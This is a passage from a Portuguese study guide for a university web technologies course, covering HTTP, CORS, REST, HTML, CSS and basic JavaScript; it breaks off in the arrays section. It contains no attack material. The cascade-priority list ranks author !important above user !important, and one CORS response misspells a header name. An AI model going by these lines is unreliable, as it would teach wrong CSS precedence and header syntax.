# 📚 Guia de Estudo Completo — LTW (Laboratório de Tecnologias Web)
> **FEUP · LEIC · 2025/2026**
> Cobre toda a matéria do exame · 11 tópicos · ~550 questões abrangidas

---

## Índice

1. [A Web e o HTTP](#1-a-web-e-o-http)
2. [HTML — Estrutura e Semântica](#2-html--estrutura-e-semântica)
3. [CSS — Estilos e Layout](#3-css--estilos-e-layout)
4. [JavaScript Básico](#4-javascript-básico)
5. [JavaScript — DOM, Eventos e AJAX](#5-javascript--dom-eventos-e-ajax)
6. [JavaScript — OOP, Módulos e Async](#6-javascript--oop-módulos-e-async)
7. [PHP — Fundamentos](#7-php--fundamentos)
8. [PHP — OOP, PDO e Boas Práticas](#8-php--oop-pdo-e-boas-práticas)
9. [Expressões Regulares](#9-expressões-regulares)
10. [Segurança Web](#10-segurança-web)
11. [MPA, SPA, PWA e Arquiteturas Web](#11-mpa-spa-pwa-e-arquiteturas-web)

---

## 1. A Web e o HTTP

### 1.1 Conceitos Fundamentais

**A Internet** é uma rede global de computadores que usa o protocolo TCP/IP.

**A Web (WWW)** foi inventada por **Tim Berners-Lee** no CERN em **1989**. Assenta em três pilares:
- **URL** — localização de recursos
- **HTTP** — protocolo de transferência
- **HTML** — linguagem de hipertexto

O **W3C** (World Wide Web Consortium), fundado em **1994**, é liderado por Tim Berners-Lee e desenvolve os padrões HTML, CSS e outras tecnologias web.

---

### 1.2 URLs (Uniform Resource Locators)

Formato geral:
```
scheme://username:password@host:port/path?query_string#fragment_id
```

| Componente | Exemplo | Notas |
|-----------|---------|-------|
| Scheme | `http://`, `https://` | obrigatório |
| Host | `www.google.com` | domínio ou IP |
| Port | `:80` | omitido se for o padrão |
| Path | `/path/page.php` | pode não corresponder a um ficheiro real |
| Query String | `?name=John&age=25` | pares chave=valor separados por `&` |
| Fragment | `#section1` | identificador de elemento na página (processado pelo browser, **não** enviado ao servidor) |

**URI vs URL vs URN:**
- **URI** (Uniform Resource Identifier) — identificador genérico
- **URL** — identifica pelo **local** (endereço de rede)
- **URN** — identifica pelo **nome**, independente da localização

---

### 1.3 HTTP — Hypertext Transfer Protocol

- Protocolo de **camada de aplicação**
- Modelo **cliente-servidor**
- **Stateless** (sem estado): cada pedido é independente

**História:**
| Versão | Ano | Novidades |
|--------|-----|-----------|
| HTTP/0.9 | 1991 | Apenas GET, sem cabeçalhos |
| HTTP/1.0 | 1992–96 | HEAD, POST, diferentes tipos de ficheiro |
| HTTP/1.1 | 1995–97 | Reutilização de ligações, cabeçalho Host (obrigatório) |
| HTTP/2.0 | 2014–15 | Revisão major, multiplexagem |
| HTTP/3 | 2019– | Sobre QUIC (Google), substitui TCP |

---

### 1.4 Pedido HTTP (Request)

Formato:
```http
MÉTODO /caminho HTTP/1.1
Cabeçalho1: Valor1
Cabeçalho2: Valor2

[corpo opcional]
```

Exemplo GET:
```http
GET /search.php?name=john HTTP/1.1
Host: www.example.com
Accept-Language: pt
```

Exemplo POST:
```http
POST /path/save.php HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

name=John%20Doe&username=johndoe
```

> ⚠️ HTTP/1.1 **exige** o cabeçalho `Host`.

---

### 1.5 Métodos HTTP

| Método | Seguro | Idempotente | Descrição |
|--------|--------|-------------|-----------|
| GET | ✅ | ✅ | Pede uma representação de um recurso |
| HEAD | ✅ | ✅ | Igual a GET mas sem corpo na resposta |
| POST | ❌ | ❌ | Cria/envia dados; cada chamada pode ter efeito diferente |
| PUT | ❌ | ✅ | Cria ou substitui o recurso no URI especificado |
| DELETE | ❌ | ✅ | Remove o recurso |
| PATCH | ❌ | ❌ | Modificação parcial de um recurso |
| OPTIONS | ✅ | ✅ | Devolve as opções de comunicação disponíveis |
| TRACE | ✅ | ✅ | Loop-back de diagnóstico |

- **Seguro** = sem efeitos secundários no servidor
- **Idempotente** = múltiplos pedidos idênticos têm o mesmo efeito que um único
- Links HTML usam sempre **GET**; formulários podem usar **GET** ou **POST**

**Corpo dos pedidos POST/PUT — Content-Type:**

| Valor | Descrição |
|-------|-----------|
| `application/x-www-form-urlencoded` | Pares chave=valor codificados em URL (padrão) |
| `multipart/form-data` | Vários corpos separados; obrigatório para ficheiros |
| `text/plain` | Texto simples |

---

### 1.6 Resposta HTTP (Response)

Formato:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1354

<html>...</html>
```

**Categorias de códigos de estado:**

| Categoria | Significado |
|-----------|-------------|
| 1xx | Informacional |
| 2xx | Sucesso |
| 3xx | Redirecionamento |
| 4xx | Erro do cliente |
| 5xx | Erro do servidor |

**Códigos mais importantes:**

| Código | Nome | Uso |
|--------|------|-----|
| 200 | OK | Pedido bem-sucedido |
| 201 | Created | Recurso criado com sucesso |
| 204 | No Content | Sucesso, sem corpo na resposta |
| 301 | Moved Permanently | Redirecionamento permanente; novo URI no `Location` |
| 304 | Not Modified | Recurso não mudou desde `If-Modified-Since` |
| 400 | Bad Request | Sintaxe inválida |
| 401 | Unauthorized | Autenticação necessária |
| 403 | Forbidden | Proibido (autenticação não ajuda) |
| 404 | Not Found | Recurso não encontrado |
| 405 | Method Not Allowed | Resposta inclui cabeçalho `Allow` |
| 418 | I'm a teapot | Brincadeira do RFC 2324 (April Fools') |
| 500 | Internal Server Error | Erro genérico do servidor |
| 503 | Service Unavailable | Servidor temporariamente indisponível |

---

### 1.7 Cabeçalhos HTTP Importantes

**Cabeçalhos do cliente:**

| Cabeçalho | Exemplo |
|-----------|---------|
| `Accept` | `text/html, application/json` |
| `Accept-Language` | `pt-PT, en-US` |
| `Cookie` | `session_id=abc123` |
| `Content-Type` | `application/json` |
| `Host` | `www.example.com` (obrigatório em HTTP/1.1) |
| `User-Agent` | `Mozilla/5.0 ...` |
| `If-Modified-Since` | permite resposta 304 |
| `Authorization` | `Bearer <token>` |

**Cabeçalhos do servidor:**

| Cabeçalho | Exemplo |
|-----------|---------|
| `Content-Type` | `text/html; charset=utf-8` |
| `Content-Length` | `1234` |
| `Location` | `/new-page.php` (redirects) |
| `Set-Cookie` | `session=abc; HttpOnly; Secure` |
| `Cache-Control` | `max-age=3600, no-cache` |
| `Allow` | `GET, POST` (para 405) |

---

### 1.8 SOP e CORS

**SOP (Same-Origin Policy):**
Política de segurança do browser que impede que scripts de uma origem acedam a recursos de outra origem. Duas URLs têm a **mesma origem** se o **protocolo**, **porto** e **host** forem idênticos.

**CORS (Cross-Origin Resource Sharing):**
Mecanismo baseado em cabeçalhos HTTP que permite ao servidor indicar quais origens podem aceder aos seus recursos.

**Preflight request:** Pedido OPTIONS enviado automaticamente pelo browser antes de pedidos complexos cross-origin:
```http
OPTIONS /savedata.php HTTP/1.1
Origin: https://foo.org
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type
```

**Resposta do servidor:**
```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://foo.org
Access-Control-Allow-Method: POST
Access-Control-Allow-Headers: Content-Type
Access-Control-Max-Age: 86400
```

**CORS em PHP:**
```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, POST');
    header('Access-Control-Allow-Headers: Content-Type');
    header('Access-Control-Max-Age: 86400');
    die();
}
```

---

### 1.9 REST (Representational State Transfer)

Estilo arquitetural para APIs web definido por Roy Fielding.

**Princípios:**
1. **Interface Uniforme** — recursos identificados por URIs; HTTP padrão para comunicação
2. **Cliente-Servidor** — separação de preocupações
3. **Stateless** — cada pedido contém toda a informação necessária
4. **Cacheable** — respostas devem indicar se são cacheáveis
5. **Sistema em Camadas** — proxies, gateways transparentes

**Exemplo de API REST:**

| URI | GET | POST | PUT | DELETE |
|-----|-----|------|-----|--------|
| `/employee` | lista todos | cria novo | — | — |
| `/employee/1234` | mostra o 1234 | — | cria/atualiza 1234 | remove 1234 |

**Negociação de conteúdo** com o cabeçalho `Accept`:
```http
GET /employee/1234 HTTP/1.1
Accept: application/json
```

---

### 1.10 PHP e HTTP

```php
// Enviar um cabeçalho
header('Location: outra_pagina.php');

// Enviar código de estado
http_response_code(404);
// ou
header('HTTP/1.0 404 Not Found');

// Verificar método do pedido
if ($_SERVER['REQUEST_METHOD'] === 'PUT') { ... }

// Verificar cabeçalho Accept
if ($_SERVER['HTTP_ACCEPT'] === 'application/json') {
    echo json_encode($data);
}
```

> ⚠️ Os cabeçalhos têm de ser enviados **antes** de qualquer output.

---

## 2. HTML — Estrutura e Semântica

### 2.1 O que é HTML?

- **H**yper **T**ext **M**arkup **L**anguage
- Linguagem de **marcação**, não de programação
- Define **estrutura** e **semântica**, não apresentação
- Evoluiu de HTML 1.0 (1989) para HTML5 (2008)

---

### 2.2 Estrutura Básica

```html
<!DOCTYPE html>
<html lang="pt">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Título da Página</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <!-- conteúdo aqui -->
  </body>
</html>
```

| Elemento | Obrigatório | Propósito |
|----------|-------------|-----------|
| `<!DOCTYPE html>` | ✅ | Declara HTML5 |
| `<html>` | ✅ | Raiz do documento |
| `<head>` | ✅ | Metadados (não visível) |
| `<title>` | ✅ | Título (não pode estar vazio) |
| `<body>` | ✅ | Conteúdo visível |

---

### 2.3 Tags e Atributos

- **Tags** em pares: `<p>conteúdo</p>`
- **Tags auto-fechadas:** `<br>`, `<img>`, `<input>`
- **Atributos booleanos:** `checked`, `disabled`, `required` (valor opcional)

**Atributos globais importantes:**

| Atributo | Uso |
|----------|-----|
| `id` | Identificador único no documento |
| `class` | Pode ter múltiplas classes (separadas por espaço) |
| `style` | CSS inline (usar com moderação) |
| `lang` | Idioma do conteúdo |
| `hidden` | Esconde o elemento |
| `data-*` | Armazenar dados personalizados (HTML5) |

> 💡 **`id` deve ser único** no documento. **`class`** pode repetir-se.

---

### 2.4 Semântica

Semântica = significado dos elementos. O HTML não é lido apenas por humanos:
- **Bots** de indexação (SEO)
- **Leitores de ecrã** (acessibilidade)
- **Outros programadores**

**Por que usar semântica?**
```html
<!-- Errado semânticamente (mesmo que visualmente igual) -->
<div class="cabecalho"><div class="titulo">Blog</div></div>

<!-- Correto -->
<header><h1>Blog</h1></header>
```

---

### 2.5 Elementos de Seccionamento

| Elemento | Significado |
|----------|-------------|
| `<header>` | Cabeçalho de uma secção ou página |
| `<footer>` | Rodapé de uma secção ou página |
| `<nav>` | Navegação |
| `<main>` | Conteúdo principal (único por página) |
| `<article>` | Conteúdo independente e redistribuível (post, notícia) |
| `<section>` | Agrupamento temático com heading |
| `<aside>` | Conteúdo tangencial ao conteúdo principal |
| `<div>` | Agrupamento genérico sem significado semântico |

---

### 2.6 Headings e Texto

```html
<h1>Título</h1>  <!-- único por página -->
<h2>Subtítulo</h2>
<h3>Secção</h3>
<!-- ... até h6 -->

<p>Parágrafo</p>
<br>  <!-- quebra de linha (dentro de um parágrafo) -->

<em>ênfase</em>           <!-- semântico: ênfase -->
<strong>importante</strong> <!-- semântico: importância -->
<mark>destacado</mark>
<del>eliminado</del>
<ins>inserido</ins>
<sub>subscrito</sub>
<sup>sobrescrito</sup>
<abbr title="HyperText Markup Language">HTML</abbr>
<blockquote cite="url">citação longa</blockquote>
<q>citação inline</q>
<time datetime="2024-01-15">15 de Janeiro de 2024</time>
<pre><code>código pré-formatado</code></pre>
```

> ⚠️ Whitespace (espaços, enters) colapsa para um único espaço, exceto em `<pre>` e `<textarea>`.

---

### 2.7 Links e Imagens

```html
<!-- Links -->
<a href="pagina.html">Relativo</a>
<a href="https://google.com" target="_blank" rel="noopener">Absoluto</a>
<a href="#secao1">Âncora interna</a>
<a href="pagina.html#secao">Âncora noutro documento</a>

<!-- Imagens -->
<img src="foto.jpg" alt="Descrição obrigatória" width="300" height="200">

<!-- Figura com legenda -->
<figure>
  <img src="grafico.png" alt="Gráfico de vendas">
  <figcaption>Fig. 1: Vendas de 2024</figcaption>
</figure>
```

> ⚠️ O atributo `alt` é **obrigatório**. Imagens decorativas devem ter `alt=""`.

---

### 2.8 Listas

```html
<!-- Lista não ordenada -->
<ul>
  <li>Item A</li>
  <li>Item B</li>
</ul>

<!-- Lista ordenada -->
<ol type="I" start="4" reversed>
  <li>Primeiro</li>
  <li value="10">Décimo</li>
</ol>

<!-- Lista de definições -->
<dl>
  <dt>HTML</dt>
  <dd>HyperText Markup Language</dd>
  <dt>CSS</dt>
  <dd>Cascading Style Sheets</dd>
</dl>
```

---

### 2.9 Tabelas

```html
<table>
  <caption>Tabela 1: Notas</caption>
  <colgroup>
    <col class="nome">
    <col span="3" class="notas">
  </colgroup>
  <thead>
    <tr>
      <th scope="col">Nome</th>
      <th scope="col">LTW</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>João</td>
      <td>18</td>
    </tr>
  </tbody>
  <tfoot>
    <tr>
      <td>Média</td>
      <td>17</td>
    </tr>
  </tfoot>
</table>
```

- `colspan` — funde colunas
- `rowspan` — funde linhas
- `<th scope="col|row|colgroup|rowgroup">` — células de cabeçalho com escopo
- **Tabelas NÃO devem ser usadas para layout!**

---

### 2.10 Formulários

```html
<form action="processar.php" method="post" enctype="multipart/form-data">
  
  <!-- Label associado por id -->
  <label for="nome">Nome:</label>
  <input type="text" id="nome" name="nome" 
         placeholder="O teu nome" required maxlength="50">

  <!-- Label envolvente -->
  <label>Email:
    <input type="email" name="email" autocomplete="email">
  </label>

  <input type="password" name="password" required>
  <input type="number" name="idade" min="0" max="120" step="1">
  <input type="date" name="nascimento" value="2000-01-01">
  <input type="range" name="volume" min="0" max="100">
  <input type="color" name="cor" value="#336699">
  <input type="file" name="ficheiro" accept="image/*" multiple>
  <input type="hidden" name="csrf" value="token123">
  <input type="checkbox" name="aceito" value="sim" checked>
  <input type="radio" name="genero" value="m"> Masculino
  <input type="radio" name="genero" value="f"> Feminino
  
  <textarea name="mensagem" rows="5" cols="60">Texto inicial</textarea>
  
  <select name="pais">
    <optgroup label="Europa">
      <option value="pt" selected>Portugal</option>
      <option value="es">Espanha</option>
    </optgroup>
  </select>

  <!-- datalist — autocomplete flexível -->
  <input name="cidade" list="cidades">
  <datalist id="cidades">
    <option>Porto</option>
    <option>Lisboa</option>
  </datalist>
  
  <fieldset>
    <legend>Dados Pessoais</legend>
    <!-- mais campos -->
  </fieldset>

  <button type="submit">Enviar</button>
  <button type="reset">Limpar</button>
  <button type="button" onclick="fazer()">Ação</button>
  
  <!-- Botão com action/method diferentes -->
  <button type="submit" formaction="guardar.php" formmethod="post">
    Guardar
  </button>
</form>
```

**Atributos comuns dos inputs:**

| Atributo | Função |
|----------|--------|
| `name` | Nome do campo (enviado ao servidor) |
| `value` | Valor inicial |
| `placeholder` | Dica antes de digitar |
| `required` | Campo obrigatório |
| `disabled` | Desativado (não enviado) |
| `readonly` | Só leitura (enviado) |
| `autocomplete` | on/off |
| `pattern` | Regex de validação (HTML5) |

**Para upload de ficheiros:** `method="post"` e `enctype="multipart/form-data"` são **obrigatórios**.

---

### 2.11 Metadados

```html
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Breve descrição da página">
  <meta name="author" content="João Silva">
  <meta name="keywords" content="web, html, css">
  <title>Título — Site</title>
  <link rel="stylesheet" href="style.css">
</head>
```

---

### 2.12 Entidades de Caracteres

| Entidade | Carácter |
|---------|----------|
| `&amp;` | & |
| `&lt;` | < |
| `&gt;` | > |
| `&quot;` | " |
| `&nbsp;` | espaço não separável |
| `&#38;` | & (decimal) |
| `&#x26;` | & (hexadecimal) |

---

## 3. CSS — Estilos e Layout

### 3.1 O que é CSS?

- **C**ascading **S**tyle **S**heets
- Descreve a **apresentação** de documentos HTML
- Baseado em **seletores** e **propriedades**
- Versões: CSS1 (1996), CSS2 (1998), CSS3 (2011–)

---

### 3.2 Formas de Aplicar CSS

```html
<!-- 1. Inline (evitar) -->
<p style="color: red; font-size: 16px;">Texto</p>

<!-- 2. Folha interna -->
<head>
  <style>
    p { color: red; }
  </style>
</head>

<!-- 3. Folha externa (preferido) -->
<head>
  <link rel="stylesheet" href="style.css">
</head>
```

---

### 3.3 Seletores

**Seletores simples:**

```css
*           /* universal — todos os elementos */
p           /* tipo/elemento */
#sidebar    /* id */
.active     /* classe */
[href]      /* atributo existe */
[type="text"]       /* atributo = valor */
[class~="btn"]      /* contém palavra */
[lang|="pt"]        /* começa por valor (palavra) */
[href^="https"]     /* começa por valor */
[href$=".pdf"]      /* termina por valor */
[href*="google"]    /* contém valor */
```

**Seletores compostos (sem separador):**
```css
button.primary           /* botão com classe primary */
input[type="text"].error /* input text com classe error */
```

**Combinadores:**

| Combinador | Símbolo | Seleciona |
|-----------|---------|-----------|
| Descendente | ` ` (espaço) | todos os descendentes |
| Filho direto | `>` | apenas filhos diretos |
| Irmão adjacente | `+` | o próximo irmão imediato |
| Irmãos subsequentes | `~` | todos os irmãos seguintes |

```css
aside a      /* todos os <a> dentro de <aside> */
aside > a    /* só os <a> filhos diretos de <aside> */
.intro + p   /* o <p> imediatamente após .intro */
.selected ~ li /* todos os <li> após .selected */
```

**Agrupamento:**
```css
h1, h2, h3 { color: navy; }
```

---

### 3.4 Pseudo-seletores

**Pseudo-classes (estado):**
```css
a:link       /* link não visitado */
a:visited    /* link visitado */
a:hover      /* mouse por cima */
a:active     /* a ser clicado */
input:focus  /* com foco */
input:valid  /* valor válido */
input:invalid
input:required
input:disabled
:checked     /* checkbox/radio marcado */
:target      /* elemento com id igual ao fragmento da URL */

:first-child   /* primeiro filho */
:last-child    /* último filho */
:nth-child(2n) /* pares */
:nth-child(2n+1) /* ímpares */
:nth-child(-n+3) /* primeiros 3 */
:first-of-type
:last-of-type
:only-child
:empty
:not(.excluir) /* negação */
```

**Pseudo-elementos:**
```css
p::first-letter  /* primeira letra */
p::first-line    /* primeira linha */
p::before        /* conteúdo antes */
p::after         /* conteúdo depois */
::selection      /* texto selecionado */
::placeholder    /* placeholder de input */
```

---

### 3.5 Especificidade e Cascata

**Cálculo da especificidade — (a, b, c):**

| Tipo de Seletor | Contribui para |
|----------------|---------------|
| `id` (#) | a |
| `class` (.), pseudo-class (:), atributo ([]) | b |
| elemento, pseudo-elemento | c |

```
*                → (0, 0, 0)
p                → (0, 0, 1)
.classe          → (0, 1, 0)
#id              → (1, 0, 0)
#id p.classe     → (1, 1, 1)
```

**Ordem da cascata (maior prioridade para menor):**
1. **Origin:** `!important` do autor > `!important` do utilizador > autor > utilizador > browser
2. **Especificidade:** maior wins
3. **Posição:** última regra wins (se tudo igual)

**Cascade Layers (`@layer`):**
```css
@layer base, components;  /* define hierarquia */

@layer base {
  #menu p { color: red; }  /* especificidade alta mas camada inferior */
}

@layer components {
  p { color: blue; }  /* especificidade baixa mas WINS — camada superior */
}
```

**Herança:** Algumas propriedades são herdadas pelos filhos (`color`, `font`, `line-height`). Pode-se forçar com `inherit`, `initial`, `unset`.

---

### 3.6 Box Model

```
┌─────────────────────────────────────┐
│              margin                 │
│  ┌───────────────────────────────┐  │
│  │            border             │  │
│  │  ┌─────────────────────────┐ │  │
│  │  │        padding          │ │  │
│  │  │  ┌───────────────────┐  │ │  │
│  │  │  │     content       │  │ │  │
│  │  │  └───────────────────┘  │ │  │
│  │  └─────────────────────────┘ │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
```

```css
/* box-sizing altera como width/height é calculado */
* { box-sizing: border-box; }  /* largura inclui padding e border */

/* Shorthands de margem e padding: top right bottom left */
margin: 10px 20px 10px 20px;
margin: 10px 20px;   /* top/bottom, left/right */
margin: 10px;        /* todos */
margin: 0 auto;      /* centrar bloco horizontalmente */

/* Border */
border: 2px solid #333;
border-radius: 8px;
border-radius: 50%;  /* círculo */

/* Margin collapse: margens adjacentes colapsam para a maior */
```

---

### 3.7 Cores

```css
color: red;
color: #336699;         /* hex */
color: #369;            /* hex curto */
color: rgb(51, 102, 153);
color: rgba(51, 102, 153, 0.5);  /* com transparência */
color: hsl(210, 50%, 40%);
color: hsla(210, 50%, 40%, 0.8);
```

---

### 3.8 Tipografia

```css
font-family: 'Inter', Arial, sans-serif;  /* pilha de fontes */
font-size: 16px;
font-size: 1rem;        /* relativo ao root */
font-size: 1.2em;       /* relativo ao pai */
font-weight: bold;      /* ou 400, 700 */
font-style: italic;
line-height: 1.6;       /* sem unidade = relativo ao font-size */
text-align: left | center | right | justify;
text-decoration: none | underline;
text-transform: uppercase | lowercase | capitalize;
letter-spacing: 0.1em;
word-spacing: 0.5em;
```

**Unidades de comprimento:**

| Unidade | Relativa a |
|---------|-----------|
| `px` | pixel absoluto |
| `em` | font-size do elemento (para font-size: herda do pai) |
| `rem` | font-size do elemento raiz (`<html>`) |
| `%` | dimensão do pai (width%, padding%, margin%) |
| `vw` / `vh` | largura/altura do viewport |
| `vmin` / `vmax` | mínimo/máximo de vw e vh |

---

### 3.9 Display e Posicionamento

**Tipos de display:**

| Valor | Comportamento |
|-------|--------------|
| `block` | Nova linha; ocupa toda a largura disponível; respeita width/height/margin |
| `inline` | Na mesma linha; ignora width/height; margin/padding vertical não afeta fluxo |
| `inline-block` | Na linha mas respeita width/height e todas as margens |
| `none` | Remove completamente do fluxo (não ocupa espaço) |
| `flex` | Contexto flexbox |
| `grid` | Contexto grid |

**Position:**

| Valor | Fluxo | Referência |
|-------|-------|-----------|
| `static` | Sim | N/A (padrão) |
| `relative` | Sim | Posição estática original |
| `absolute` | Não | Ancestral posicionado mais próximo |
| `fixed` | Não | Viewport (não move com scroll) |
| `sticky` | Sim (até threshold) | Viewport quando threshold atingido |

```css
.parent { position: relative; }
.child {
  position: absolute;
  top: 10px;
  right: 10px;
}

/* z-index: só funciona em elementos posicionados (não static) */
.overlay { position: relative; z-index: 10; }
```

**Float:**
```css
img { float: left; }    /* texto flui à volta */
.clear { clear: both; } /* não permite floats ao lado */
```

**Overflow:**
```css
overflow: visible | hidden | scroll | auto;
```

---

### 3.10 Flexbox

```css
.container {
  display: flex;
  
  /* Direção do eixo principal */
  flex-direction: row | row-reverse | column | column-reverse;
  
  /* Quebra de linha */
  flex-wrap: nowrap | wrap | wrap-reverse;
  
  /* Alinhamento no eixo principal */
  justify-content: flex-start | flex-end | center 
                 | space-between | space-around | space-evenly;
  
  /* Alinhamento no eixo cruzado */
  align-items: stretch | flex-start | flex-end | center | baseline;
  
  /* Alinhamento de múltiplas linhas */
  align-content: flex-start | flex-end | center | space-between | space-around;
  
  gap: 10px;            /* espaço entre itens */
  gap: 10px 20px;       /* row-gap column-gap */
}

.item {
  flex-grow: 1;      /* proporção de crescimento (0 = não cresce) */
  flex-shrink: 1;    /* proporção de encolhimento (0 = não encolhe) */
  flex-basis: 200px; /* tamanho base antes de distribuir espaço */
  flex: 1;           /* shorthand: grow shrink basis */
  
  align-self: auto | flex-start | flex-end | center | stretch;
  order: 0;          /* ordem de exibição */
}
```

> 💡 `flex: 1` é equivalente a `flex-grow: 1; flex-shrink: 1; flex-basis: 0%`

---

### 3.11 CSS Grid

```css
.container {
  display: grid;
  
  /* Define colunas: 3 colunas iguais */
  grid-template-columns: 1fr 1fr 1fr;
  /* ou com repeat */
  grid-template-columns: repeat(3, 1fr);
  /* ou misto */
  grid-template-columns: 200px auto 1fr;
  
  /* Define linhas */
  grid-template-rows: auto 1fr auto;
  
  /* Espaços */
  gap: 10px;
  column-gap: 20px;
  row-gap: 10px;
}

.item {
  /* Posicionamento por linhas de grid */
  grid-column: 1 / 3;     /* da coluna 1 à 3 */
  grid-column: span 2;    /* ocupa 2 colunas */
  grid-row: 1 / 2;
  
  /* Shorthand */
  grid-area: 1 / 1 / 2 / 3; /* row-start / col-start / row-end / col-end */
}

/* Grid com template de áreas */
.container {
  grid-template-areas:
    "header header"
    "sidebar main"
    "footer footer";
}
.header { grid-area: header; }
.sidebar { grid-area: sidebar; }
```

---

### 3.12 Transições e Animações

```css
/* Transição */
.btn {
  background-color: blue;
  transition: background-color 0.3s ease-in-out,
              transform 0.2s ease;
}
.btn:hover {
  background-color: darkblue;
  transform: scale(1.05);
}

/* Propriedades de transição */
transition-property: all | color | opacity;
transition-duration: 0.3s;
transition-delay: 0.1s;
transition-timing-function: ease | linear | ease-in | ease-out | ease-in-out;

/* Animações */
@keyframes slide-in {
  from { transform: translateX(-100%); opacity: 0; }
  to   { transform: translateX(0);    opacity: 1; }
}

.modal {
  animation: slide-in 0.5s ease forwards;
  animation-iteration-count: 1 | infinite;
  animation-direction: normal | reverse | alternate;
}
```

---

### 3.13 Transformações

```css
transform: rotate(30deg);          /* rotação */
transform: scale(1.5);             /* escala */
transform: translate(10px, 20px);  /* translação */
transform: skew(30deg);            /* inclinação */
transform: rotate(30deg) scale(0.5); /* combinação */

transform-origin: center;          /* ponto de origem */
transform-origin: top left;
```

---

### 3.14 Variáveis CSS (Custom Properties)

```css
:root {
  --primary-color: #336699;
  --font-size-base: 16px;
  --spacing: 1rem;
}

.button {
  background-color: var(--primary-color);
  font-size: var(--font-size-base);
  /* valor de fallback */
  margin: var(--spacing, 1rem);
}

/* Variáveis são herdadas */
section { --text-color: blue; }
h1 { --text-color: red; }
section * { color: var(--text-color); }
/* h1 usa red (definido localmente), resto usa blue (herdado de section) */
```

---

### 3.15 Design Responsivo

```html
<!-- Meta viewport obrigatório -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

```css
/* Media Queries */
@media (max-width: 768px) {
  .sidebar { display: none; }
}

@media (min-width: 768px) and (max-width: 1024px) {
  /* tablet */
}

@media screen and (orientation: landscape) {
  /* paisagem */
}

@media print {
  .no-print { display: none; }
}
```

Em HTML:
```html
<link rel="stylesheet" media="(min-width: 800px)" href="large.css">
```

**Mobile-first** vs Desktop-first:
- **Mobile-first:** estilos base para mobile, `min-width` para aumentar
- **Desktop-first:** estilos base para desktop, `max-width` para reduzir

---

### 3.16 Prefixos de Vendor

```css
.round {
  -webkit-border-radius: 5px;  /* Chrome, Safari */
  -moz-border-radius: 5px;     /* Firefox */
  -o-border-radius: 5px;       /* Opera */
  border-radius: 5px;          /* padrão — sempre por último */
}
```

---

## 4. JavaScript Básico

### 4.1 Introdução

- Linguagem **dinâmica**, **interpretada**, **tipagem fraca**
- **Orientada a objetos** baseada em **protótipos** (não em classes, embora suporte sintaxe de classes)
- Funções são **cidadãos de primeira classe**
- Criada por Brendan Eich na Netscape em 1995
- Padrão: **ECMAScript** (Ecma International)

---

### 4.2 Variáveis e Tipos

```javascript
// Declaração de variáveis
const PI = 3.14159;   // constante (preferido)
let nome = 'João';    // variável com escopo de bloco
var antigo = true;    // evitar! escopo de função, não de bloco

// Tipos primitivos
typeof 42           // "number"
typeof 42n          // "bigint" (números inteiros arbitrários)
typeof "olá"        // "string"
typeof true         // "boolean"
typeof undefined    // "undefined"
typeof null         // "object" (quirk histórico!)
typeof Symbol()     // "symbol"

// Objetos
typeof {}           // "object"
typeof []           // "object"
typeof function(){} // "function"
```

**Strings:**
```javascript
const a = 'simples';
const b = "duplo";
const c = `template literal: ${1 + 2}`  // "template literal: 3"
```

**Conversões:**
```javascript
Number("42")       // 42
parseInt("42px")   // 42 (especificar base!)
parseInt("0xFF", 16) // 255
parseFloat("3.14") // 3.14
String(42)         // "42"
Boolean(0)         // false
Boolean("")        // false
Boolean(null)      // false
Boolean(undefined) // false
Boolean(NaN)       // false
// Todos os outros valores → true (incluindo [] e {})
```

**Comparação:**
```javascript
// == (igualdade abstrata — faz conversão de tipo)
1 == '1'   // true
0 == false // true

// === (igualdade estrita — sem conversão)
1 === '1'  // false
0 === false // false

// null e undefined
null == undefined   // true
null === undefined  // false

// Objetos comparam por referência
[1,2] == [1,2]  // false!
```

**Nullish Coalescing:**
```javascript
const valor = config ?? 'default';  // usa 'default' só se config for null ou undefined
const valor2 = config || 'default'; // usa 'default' para QUALQUER valor falsy
```

**Optional Chaining:**
```javascript
const cidade = user?.address?.city; // não lança erro se user ou address for null/undefined
const primeiro = arr?.[0];
const resultado = obj.metodo?.();
```

---

### 4.3 Controlo de Fluxo

```javascript
// if / else if / else
if (x > 0) { ... }
else if (x < 0) { ... }
else { ... }

// Ternário
const msg = x > 0 ? 'positivo' : 'negativo';

// switch
switch (dia) {
  case 'segunda': doSomething(); break;
  case 'terça':
  case 'quarta':  doSomethingElse(); break;
  default:        handleDefault();
}

// Loops
for (let i = 0; i < 10; i++) { ... }

for (const item of array) { ... }      // iteráveis (arrays, strings, maps...)
for (const key in objeto) { ... }      // propriedades de objetos (evitar em arrays!)

let i = 0;
while (i < 10) { i++; }

do { i++; } while (i < 10);

// break e continue
for (const x of arr) {
  if (x === 0) continue;  // salta esta iteração
  if (x < 0) break;       // sai do loop
}
```

---

### 4.4 Funções

```javascript
// Declaração de função (hoisted)
function somar(a, b) {
  return a + b;
}

// Expressão de função
const multiplicar = function(a, b) {
  return a * b;
};

// Arrow function (não tem próprio 'this')
const dividir = (a, b) => a / b;
const dobrar = x => x * 2;
const cumprimentar = () => 'Olá!';

// Parâmetros padrão
function criar(nome, idade = 25) {
  return { nome, idade };
}

// Rest parameters
function somar(...numeros) {
  return numeros.reduce((acc, n) => acc + n, 0);
}
somar(1, 2, 3, 4) // 10

// Spread operator
const arr1 = [1, 2];
const arr2 = [3, 4];
const todos = [...arr1, ...arr2]; // [1, 2, 3, 4]

Math.max(...arr1); // equivalente a Math.max(1, 2)
```

---

### 4.5 Arrays

```javascript
const anos = [1990, 1991, 1992];

// Acesso
anos[0]          // 1990
anos.length      // 3

// Mutadores
anos.push(1993)           // adiciona no fim
anos.pop()                // remove do fim
anos.unshift(1989)        // adiciona no início
anos.shift()              // remove do início
anos.reverse()            // inverte
anos.sort()               // ordena (strings por padrão!)
